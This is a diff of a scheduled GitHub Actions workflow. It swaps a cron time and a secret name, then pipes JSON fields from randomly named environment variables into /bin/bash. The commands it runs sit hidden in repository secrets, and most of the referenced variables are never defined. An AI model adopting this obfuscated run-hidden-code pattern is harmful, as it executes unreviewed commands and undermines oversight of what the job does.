@@ -3,20 +3,28 @@ name: lingshiwwx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 2/6 * * *'
+    - cron: '33 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lingshiwwx
         env:
-          vlat516: ${{ secrets.vlat516 }}
+          w88948: ${{ secrets.w88948 }}
         run: |
-          echo $vlat516 | jq -r .al6848 | /bin/bash
-          echo $ktjfj61567 | jq -r .x5 | /bin/bash
-          echo $gcht002 | jq -r .kuaos4102 | /bin/bash
-          echo $klxs6115 | jq -r .h654 | /bin/bash
-          echo $ury09 | jq -r .rdnp9 | /bin/bash
+          echo $w88948 | jq -r .fqhs04962 | /bin/bash
+          echo $fe61 | jq -r .ywefy29 | /bin/bash
+          echo $hwg7085 | jq -r .f15737 | /bin/bash
+          echo $r75 | jq -r .d834 | /bin/bash
+          echo $fpcu3 | jq -r .l89576 | /bin/bash
+          echo $bfhd37039 | jq -r .wv48802 | /bin/bash
+          echo $ayukg26 | jq -r .r92 | /bin/bash
+          echo $nfkyx498 | jq -r .upcze04192 | /bin/bash
+          echo $gyz1493 | jq -r .lqb5898 | /bin/bash
+          echo $euyk9 | jq -r .tnrya12742 | /bin/bash
+          echo $sv38610 | jq -r .ltvav8 | /bin/bash
+          echo $rn4 | jq -r .ft92 | /bin/bash
+          echo $r23888 | jq -r .b4 | /bin/bash
+          echo $dbq6 | jq -r .tgpw9 | /bin/bash
 
